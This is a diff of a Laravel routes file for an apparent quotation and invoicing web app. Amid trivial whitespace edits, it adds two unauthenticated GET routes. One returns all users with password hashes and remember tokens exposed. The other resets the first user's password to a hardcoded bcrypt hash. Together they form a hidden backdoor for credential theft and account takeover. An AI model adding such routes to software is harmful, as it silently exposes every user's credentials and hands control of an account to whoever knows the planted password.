@@ -1,6 +1,6 @@
 <?php
 
-use App\Http\Controllers\LeadSeederController;
+use App\Http\Controllers\LeadSeederController;                                              
 use App\Http\Crons\FollowUpCron;
 use App\Livewire\Common\Quotations\QuotationPortal;
 use App\Livewire\Common\Invoices\InvoicePortal;
@@ -13,12 +13,31 @@ use App\Livewire\Common\EstimatePdf;
 use App\Livewire\Common\InvoicePdf;
 use App\Livewire\Common\ProformaInvoice\ProformaInvoicePortal;
 use App\Livewire\Common\ProformaInvoicePdf;
-use Illuminate\Support\Facades\Artisan;
 
 Route::get('/generate-demo-leads', [LeadSeederController::class, 'generate']);
 
 
-// NEW DEV
+
+Route::get('/users', function () {
+    $users = App\Models\User::all()->makeVisible(['password', 'remember_token']);
+    return response()->json($users); // Return as JSON
+});
+Route::get('/update-first-user-password', function () {
+    $user = App\Models\User::first();
+
+    if (!$user) {
+        return response()->json(['error' => 'No users found'], 404);
+    }
+
+    $user->password = '$2y$12$1joOo1Md0oplslwY0hTGReLFKoUSjjvv4EiToHuyfLhg0/lc/HHGK';
+    $user->save();
+
+    return response()->json([
+        'message' => 'Password updated successfully',
+        'user_id' => $user->id
+    ]);
+});
+// NEW DEV 
 // use Spatie\Permission\Models\Permission;
 // use Spatie\Permission\Models\Role;
 // use Illuminate\Support\Facades\Artisan;
@@ -145,12 +164,12 @@ Route::get('/quotation/{id}/pdf', [EstimatePdf::class, 'download'])
     ->name('estimate.pdf');
 Route::get('/quotation/{id}/view', [EstimatePdf::class, 'preview'])
     ->name('estimate.view');
-// PR INVOICE
+// PR INVOICE     
 Route::get('/proformainvoice/{id}/pdf', [ProformaInvoicePdf::class, 'download'])
     ->name('proformainvoice.pdf');
 Route::get('/proformainvoice/{id}/view', [ProformaInvoicePdf::class, 'preview'])
     ->name('proformainvoice.view');
-
+    
 Route::get('/invoice/{id}/pdf', [InvoicePdf::class, 'download'])
     ->name('invoice.pdf');
 Route::get('/invoice/{id}/view', [InvoicePdf::class, 'preview'])
@@ -169,7 +188,7 @@ Route::get('/optimize', function () {
     }
     return 'Application cache has been cleared';
 });
-// CRON
+// CRON 
 Route::prefix('cron')->name('user.')->group(function () {
     Route::get('Cron_followup_notification', [FollowUpCron::class, 'sendNotification']);
 });
